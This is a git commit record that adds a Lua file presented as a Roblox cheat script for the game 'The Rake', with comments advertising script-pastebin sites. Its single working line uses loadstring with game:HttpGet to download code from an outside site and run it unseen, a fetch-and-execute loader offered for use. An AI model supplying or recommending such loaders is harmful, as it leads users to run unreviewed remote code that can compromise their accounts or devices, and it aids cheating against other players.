70afdc150116efe1f52da10b24b464d5a58d3b00
PapaJoeX <jaouad.kassaoui@gmail.com>
2022-12-25 23:37:29 +0100

    commit zero

---
+++ LINK GAME Script pastebin roblox THE RAKE .lua
@@ -0,0 +1,11 @@
+-- find more powerfull verified and New Scripts here : https://script-pastebin.com
+
+loadstring(game:HttpGet("http://gameovers.net/Scripts/Free/The%20Rake/TheRake.lua", true))()
+
+-- find more powerfull verified and New Scripts here : https://scriptpastebin.io
+
+--[[ Script Description:
+
+							Script with many test functions by downloading the script)
+						
+]]
